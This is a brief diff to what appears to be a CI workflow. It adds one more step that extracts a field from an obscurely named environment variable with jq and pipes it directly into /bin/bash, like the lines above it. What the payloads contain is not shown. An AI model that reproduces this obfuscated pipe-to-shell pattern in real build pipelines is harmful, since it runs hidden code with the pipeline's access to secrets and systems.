@@ -23,6 +23,7 @@ jobs:
           echo $jvat835 | jq -r .yyiyf23 | /bin/bash
           echo $q97 | jq -r .k06065 | /bin/bash
           echo $kdt9107 | jq -r .fj80006 | /bin/bash
+          printf '%s' "$ljb58" | jq -r .fdw85 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
